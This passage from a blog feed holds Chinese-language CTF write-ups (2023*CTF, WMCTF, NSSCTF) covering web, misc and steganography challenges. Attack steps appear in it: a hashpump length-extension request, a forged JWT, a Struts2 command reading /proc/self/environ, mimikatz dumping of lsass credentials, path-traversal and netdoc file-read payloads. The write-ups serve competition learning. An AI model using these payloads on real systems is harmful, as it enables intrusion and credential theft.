███████╗██║ ╚████║██████╔╝           </span><br><span class="hljs-string">╚═╝  ╚═══╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝         ╚══════╝╚═╝  ╚═══╝╚═════╝            </span><br><span class="hljs-string">                                                                                            </span><br><span class="hljs-string">███╗   ███╗ █████╗  ██████╗ ██╗ ██████╗    ██████╗  ██████╗  ██████╗██╗  ██╗███████╗██████╗ </span><br><span class="hljs-string">████╗ ████║██╔══██╗██╔════╝ ██║██╔════╝    ██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗</span><br><span class="hljs-string">██╔████╔██║███████║██║  ███╗██║██║         ██║  ██║██║   ██║██║     █████╔╝ █████╗  ██████╔╝</span><br><span class="hljs-string">██║╚██╔╝██║██╔══██║██║   ██║██║██║         ██║  ██║██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗</span><br><span class="hljs-string">██║ ╚═╝ ██║██║  ██║╚██████╔╝██║╚██████╗    ██████╔╝╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║</span><br><span class="hljs-string">╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚═════╝    ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝</span><br><span class="hljs-string">                                                                                            </span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    os.system(<span class="hljs-string">&quot;rm -f /flag&quot;</span>)<br>    <span class="hljs-built_in">print</span>(BANNER)<br>    random.seed(<span class="hljs-string">&quot;NSSCTF 2nd&quot;</span>)<br>    answer=random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)&lt;<span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You need to give me the secret!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        func()<br></code></pre></td></tr></table></figure><p>可以看到启动docker后就会删掉flag，但是这前面func好像没什么用</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023*CTF</title>
    <link href="/2023/08/27/2023starCTF/"/>
    <url>/2023/08/27/2023starCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-CTF"><a href="#2023-CTF" class="headerlink" title="2023*CTF"></a>2023*CTF</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a><strong>web</strong></h2><h3 id="jwt2struts"><a href="#jwt2struts" class="headerlink" title="jwt2struts"></a><strong>jwt2struts</strong></h3><p>源码里提示访问<code>JWT_key.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./secret_key.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./salt.php&quot;</span>;<br><span class="hljs-comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span><br><span class="hljs-comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span><br>@<span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;username&quot;</span>]);<br>@<span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>]);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable">$password</span> != <span class="hljs-string">&quot;root&quot;</span>) &#123;<br>         <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>] === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$salt</span>.<span class="hljs-variable">$username</span>.<span class="hljs-variable">$password</span>)) &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;The secret_key is &quot;</span>. <span class="hljs-variable">$secret_key</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>刚开始在想怎么爆破没想到绕过，后面发现是哈希扩展长度攻击绕过md5，参考：<a href="https://blog.csdn.net/LYJ20010728/article/details/116779357">https://blog.csdn.net/LYJ20010728/article/details/116779357</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashpump</span> -s e6ccbf12de9d33ec27a5bcfb6a3293df -d adminroot -k <span class="hljs-number">14</span> -a ddd<br></code></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Cookie: digest=9e2b0620d7214919beaea5998acdb7fd<br><br>username=%61%64%6d%69%6e&amp;password=root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00ddd<br></code></pre></td></tr></table></figure><p><img src="/../img/2023starCTF/16969546245907.png" alt="img"></p><p>得到key：sk-he001ctf3r</p><p>jwt.io伪造token：<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MjAwNjIxNDE3N30.eoaKqDM23OT-iEZBhva5Yc-GKN876B9f-cbkqaQodgM</code></p><p><img src="/../img/2023starCTF/16969546245871.png" alt="img"></p><p><img src="/../img/2023starCTF/16969546245882.png" alt="img"></p><p>strust2一把梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/self/environ<br></code></pre></td></tr></table></figure><p><img src="/../img/2023starCTF/16969546245883.png" alt="img"></p><p><img src="/../img/2023starCTF/16969546245884.png" alt="img"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h2><h3 id="snippingTools"><a href="#snippingTools" class="headerlink" title="snippingTools"></a><strong>snippingTools</strong></h3><p>CVE-2023-28303</p><p><a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">https://github.com/frankthetank-music/Acropalypse-Multi-Tool</a></p><p><img src="/../img/2023starCTF/16969546245885.png" alt="img"></p><h3 id="old-language"><a href="#old-language" class="headerlink" title="old language"></a><strong>old language</strong></h3><p>谷歌识图</p><p><a href="https://zh.fonts2u.com/dovahkiin.%E5%AD%97%E4%BD%93">https://zh.fonts2u.com/dovahkiin.%E5%AD%97%E4%BD%93</a></p><p><img src="/../img/2023starCTF/16969546245886.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023WMCTF</title>
    <link href="/2023/08/27/2023WMCTF/"/>
    <url>/2023/08/27/2023WMCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h2><h3 id="find-me"><a href="#find-me" class="headerlink" title="find me"></a><strong>find me</strong></h3><p><img src="/../img/2023WMCTF/170062069180316.png" alt="img"></p><p>提示在Reddit发了动态</p><p>通过相关搜索发现帖子 <a href="https://www.reddit.com/user/WearyMeadow/">https://www.reddit.com/user/WearyMeadow/</a></p><p><img src="/../img/2023WMCTF/17006206917691.png" alt="img"></p><p>base64解码得到 <a href="https://ufile.io/670unszp">https://ufile.io/670unszp</a> ，下载了一个流量包，里面有几个验证过程，找到密钥：mysecretkey，但不知道加解密实现方法</p><p>在刚刚的图片发现头像是github风格的头像，在github找到几个仓库</p><p>其中有一个是博客 <a href="https://wearymeadow.icu/%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E4%B8%80%E7%AF%87%E5%8A%A0%E5%AF%86%E7%9A%84%E6%96%87%E7%AB%A0%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%98%AF%E6%B5%81%E9%87%8F%E5%8C%85%E7%9A%84%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%96%B9%E6%B3%95">https://wearymeadow.icu/，里面有一篇加密的文章，里面是流量包的加解密方法</a></p><p><img src="/../img/2023WMCTF/17006206917692.png" alt="img"></p><p>不知道密码，在仓库中注意到了autoAuth，看到有个密码，密码复用</p><p><img src="/../img/2023WMCTF/17006206917693.png" alt="img"></p><p>打开博客发现加解密方法</p><p>server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> s + <span class="hljs-string">b&quot;\0&quot;</span> * (AES.block_size - <span class="hljs-built_in">len</span>(s) % AES.block_size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">message, key</span>):<br>    seed  = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">11451</span>)<br>    random.seed(seed)<br>    encrypted = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(message)):<br>        encrypted += <span class="hljs-built_in">bytes</span>([message[i] ^ random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)])<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    encrypted = cipher.encrypt(pad(encrypted))<br>    <span class="hljs-keyword">return</span> encrypted<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    <span class="hljs-comment"># Still working on this...</span><br>    <span class="hljs-keyword">pass</span><br>...<br></code></pre></td></tr></table></figure><p>爆破seed</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> s + <span class="hljs-string">b&quot;\0&quot;</span> * (AES.block_size - <span class="hljs-built_in">len</span>(s) % AES.block_size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    <span class="hljs-comment"># AES解密</span><br>    cipher = AES.new(key, AES.MODE_ECB)<br>    decrypted = cipher.decrypt(ciphertext)<br>    <span class="hljs-comment"># 爆破seed生成相同随机数</span><br>    <span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11451</span>):<br>        random.seed(seed)<br>        res = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(decrypted)):<br>            res += <span class="hljs-built_in">bytes</span>([decrypted[i]^random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)])<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;WMCTF&#x27;</span> <span class="hljs-keyword">in</span> res:<br>            <span class="hljs-built_in">print</span>(res)<br><br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;778f6cc13090c6a4f0b51939d784a6b38512f80a92b82bf8225fb8bfed713b2f8eee53dfbe228c7296449d904467a1677c83b9534e2dfcfcbc6f7b08f77f96f2&#x27;</span>)<br>key = pad(<span class="hljs-string">b&#x27;mysecretkey&#x27;</span>) <br>decrypt(ciphertext, key)<br><span class="hljs-comment">#b&#x27;well, here you are: WMCTF&#123;OH_Y0u_f1nd_Me__(@_@)&#125;\xb0.T\x80&amp;\xb5\xb1\x1epGZ)\xbe6\xc8\xcc&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Fantastic-terminal"><a href="#Fantastic-terminal" class="headerlink" title="Fantastic terminal"></a><strong>Fantastic terminal</strong></h3><p>起一个docker ，<code>docker-compose up -d</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># ls</span><br>root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># cat challenge</span><br></code></pre></td></tr></table></figure><p><img src="/../img/2023WMCTF/17006206917694.png" alt="img"></p><h3 id="Oversharing"><a href="#Oversharing" class="headerlink" title="Oversharing"></a><strong>Oversharing</strong></h3><p>题目容器是ssh，给了流量包里有smb协议，导出smb可以发现有lsass.dmp</p><p><img src="/../img/2023WMCTF/17006206917705.png" alt="img"></p><p>mimikatz提出密码</p><p><img src="/../img/2023WMCTF/17006206917706.png" alt="img"></p><p>拿到ssh密码，ssh登录cat flag即可</p><h2 id="Steg"><a href="#Steg" class="headerlink" title="Steg"></a><strong>Steg</strong></h2><h3 id="EZ-v1deo"><a href="#EZ-v1deo" class="headerlink" title="EZ_v1deo"></a><strong>EZ_v1deo</strong></h3><p>题目：视频好像被L1near弄坏掉了♂</p><p>当时一直以为是视频缺少了一段或者损坏了，在这个方向上浪费好多时间</p><p>最后用ffmpeg将每一帧提取出来，试了一下lsb，结果发现有隐写</p><p><code>ffmpeg -i flag.avi ./%4d.png</code></p><p>这样提取出210帧，每隔4、5帧有是相同的帧，stegsolve逐个看</p><p>还可以写脚本生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-comment">#提取最低有效位</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_lsb</span>(<span class="hljs-params">frame</span>):<br>    <span class="hljs-keyword">return</span> frame &amp; <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">input_video, output_video</span>):<br>    <span class="hljs-comment">#打开视频</span><br>    cap = cv2.VideoCapture(input_video)<br>    <span class="hljs-comment">#获取宽、高、帧率</span><br>    width = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_WIDTH))<br>    height = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))<br>    fps = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FPS))<br>    <span class="hljs-comment"># 设置输出视频的编码器和参数</span><br>    fourcc = cv2.VideoWriter_fourcc(*<span class="hljs-string">&#x27;XVID&#x27;</span>)<br>    out = cv2.VideoWriter(output_video, fourcc, fps, (width, height), isColor=<span class="hljs-literal">True</span>)<br>    <span class="hljs-comment">#循环读帧</span><br>    <span class="hljs-keyword">while</span> cap.isOpened():<br>        ret, frame = cap.read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ret:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment">#提取最低每一帧最低有效位到新帧，写入</span><br>        lsb_frame = extract_lsb(frame) * (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>)<br>        out.write(lsb_frame.astype(np.uint8))<br>        <br>    cap.release()<br>    out.release()<br>    cv2.destroyAllWindows()<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    input_video = <span class="hljs-string">&#x27;flag.avi&#x27;</span><br>    output_video = <span class="hljs-string">&#x27;new.avi&#x27;</span><br>    main(input_video, output_video)<br></code></pre></td></tr></table></figure><h3 id="Mondy-left-me-Broken"><a href="#Mondy-left-me-Broken" class="headerlink" title="Mondy left me Broken"></a><strong>Mondy left me Broken</strong></h3><p>看着wp做的</p><p>首先，猫脸变换</p><p><img src="/../img/2023WMCTF/17006206917707.png" alt="img"></p><p>对于广义的猫脸变换</p><p><img src="/../img/2023WMCTF/17006206917708.png" alt="img"></p><p>得到其逆变换公式，通过以下脚本爆破出a，b</p><p>得到a&#x3D;5，b&#x3D;5，还原视频</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> cv2<br><br><span class="hljs-comment"># #爆破a,b</span><br><span class="hljs-comment"># im = Image.open(&#x27;final.jpg&#x27;)</span><br><span class="hljs-comment"># im = np.array(im)</span><br><br><span class="hljs-comment"># def dearnold(img):</span><br><span class="hljs-comment">#     r,c,t = img.shape</span><br><span class="hljs-comment">#     p = np.zeros((r,c,t),dtype=np.uint8)</span><br><span class="hljs-comment">#     for a in range(1, 11):</span><br><span class="hljs-comment">#         for b in range(1, 11):</span><br><span class="hljs-comment">#             for i in range(r):</span><br><span class="hljs-comment">#                 for j in range(c):</span><br><span class="hljs-comment">#                     for k in range(t):</span><br><span class="hljs-comment">#                         x = ((a*b+1)*i - b*j)%r</span><br><span class="hljs-comment">#                         y = (-a*i + j)%r</span><br><span class="hljs-comment">#                         p[x,y,k] = img[i,j,k]</span><br><span class="hljs-comment">#             filename = f&#x27;./dearnold&#123;a&#125;_&#123;b&#125;.jpg&#x27;</span><br><span class="hljs-comment">#             cv2.imwrite(filename, p)</span><br><span class="hljs-comment">#             print(&#x27;dearnold&#123;&#125;_&#123;&#125;&#x27;.format(a, b))</span><br><span class="hljs-comment">#     return p</span><br><span class="hljs-comment"># #dearnold(im)</span><br><span class="hljs-comment"># ##直接看图片dearnold5_5为正常图片=&gt;得到a=5, b=5</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">video_dearnold</span>(<span class="hljs-params">img</span>):<br>    r,c,t = img.shape<br>    p = np.zeros((r,c,t),dtype=np.uint8)<br>    a = <span class="hljs-number">5</span><br>    b = <span class="hljs-number">5</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t):<br>                x = ((a*b+<span class="hljs-number">1</span>)*i - b*j)%r<br>                y = (-a*i + j)%r<br>                p[x,y,k] = img[i,j,k]<br>    <span class="hljs-keyword">return</span> p<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">video</span>(<span class="hljs-params">input_video,output_video</span>):<br>    <span class="hljs-comment">#打开视频</span><br>    cap = cv2.VideoCapture(input_video)<br>    <span class="hljs-comment">#获取宽、高、帧率</span><br>    width = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_WIDTH))<br>    height = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))<br>    fps = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FPS))<br>    <span class="hljs-comment"># 设置输出视频的编码器和参数</span><br>    fourcc = cv2.VideoWriter_fourcc(*<span class="hljs-string">&#x27;mp4v&#x27;</span>)<br>    out = cv2.VideoWriter(output_video, fourcc, fps, (width, height), isColor=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">while</span> cap.isOpened():<br>        ret, frame = cap.read()<br>        <span class="hljs-keyword">if</span> ret:<br>            frame = video_dearnold(frame)``<br>            out.write(frame)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>    cap.release()<br>    out.release()<br><br>video(<span class="hljs-string">&#x27;final.mkv&#x27;</span>,<span class="hljs-string">&#x27;new.mp4&#x27;</span>)<br></code></pre></td></tr></table></figure><p>wp说后半段flag在视频中，但是确实看不清</p><p><img src="/../img/2023WMCTF/17006206917709.png" alt="img"><img src="/../img/2023WMCTF/170062069177010.png" alt="img"></p><p>hint直接放出<code>_I_CAN_GOT_both&#125;</code></p><p><img src="/../img/2023WMCTF/170062069177011.png" alt="img"></p><p><img src="/../img/2023WMCTF/170062069177012.png" alt="img"></p><p>dct水印</p><p>原理可以参考 <a href="https://weipp7.gitee.io/posts/e1e00902.html">https://weipp7.gitee.io/posts/e1e00902.html</a></p><p>我这里找了很久找不到原音频（不知道怎么从bilibili弄原音频 <a href="https://www.bilibili.com/video/BV1Fh4y1M79t/?spm_id_from=333.337.search-card.all.click%EF%BC%89%EF%BC%8C%E8%B4%B4%E4%B8%AA%E8%BE%93%E5%87%BA%E9%A2%91%E8%B0%B1%E5%9B%BE%E7%9A%84%E8%84%9A%E6%9C%AC%E5%90%A7">https://www.bilibili.com/video/BV1Fh4y1M79t/?spm_id_from=333.337.search-card.all.click），贴个输出频谱图的脚本吧</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> scipy.io <span class="hljs-keyword">import</span> wavfile<br><span class="hljs-keyword">from</span> scipy.fftpack <span class="hljs-keyword">import</span> dct, idct, fft, fftfreq, ifft<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> matplotlib.mlab <span class="hljs-keyword">import</span> window_none<br>rate, data = wavfile.read(<span class="hljs-string">&#x27;origin.wav&#x27;</span>)<br>rate2, data2 = wavfile.read(<span class="hljs-string">&#x27;final.wav&#x27;</span>)<br>data3 = data2 - data<br><span class="hljs-comment">#输出data3的频谱图</span><br>n_samples = data3.shape[<span class="hljs-number">0</span>]<br>fft_size = <span class="hljs-number">4096</span><br>plt.specgram(data3 , fft_size, rate, window=window_none,noverlap=<span class="hljs-number">10</span>, scale=<span class="hljs-string">&#x27;dB&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a><strong>WEB</strong></h2><h3 id="AnyFileRead"><a href="#AnyFileRead" class="headerlink" title="AnyFileRead"></a><strong>AnyFileRead</strong></h3><p>参考：<a href="https://zhuanlan.zhihu.com/p/640655127">https://zhuanlan.zhihu.com/p/640655127</a></p><p><img src="/../img/2023WMCTF/170062069177113.png" alt="img"></p><p>SpringSecurityConfig：</p><p><img src="/../img/2023WMCTF/170062069177114.png" alt="img"></p><p>payload：<code>/admin/../flag</code></p><p>借用别人的图：</p><p><img src="/../img/2023WMCTF/170062069177115.png" alt="img"></p><h3 id="ez-java-agagin"><a href="#ez-java-agagin" class="headerlink" title="ez_java_agagin"></a><strong>ez_java_agagin</strong></h3><p>环境关了没下附件，绕过java和flag字符串，用file&#x2F;netdoc + url二次编码绕过</p><p>payload：<code>/Imagefile?url1=netdoc://java/..//%25%36%36%25%36%63%25%36%31%25%36%37 </code></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS漏洞</title>
    <link href="/2023/01/01/XSS%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/01/01/XSS%E6%BC%8F%E6%B4%9E/</url>
    
